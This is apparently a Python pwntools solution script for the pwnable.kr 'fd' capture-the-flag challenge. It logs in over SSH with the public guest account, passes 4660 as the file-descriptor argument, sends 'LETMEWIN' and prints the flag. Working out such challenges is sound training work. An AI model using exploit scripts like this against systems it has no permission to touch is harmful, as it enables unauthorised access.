from pwn import *

#connecting through ssh 
ssh_connection = ssh(user="fd",host="pwnable.kr",port=2222,password="guest")
proc = ssh_connection.process(executable="/home/fd/fd",argv=["fd","4660"])
proc.sendline(b"LETMEWIN")
proc.recvline()
flag = proc.recvline().decode("utf-8")

print(f"Flag: {flag}")

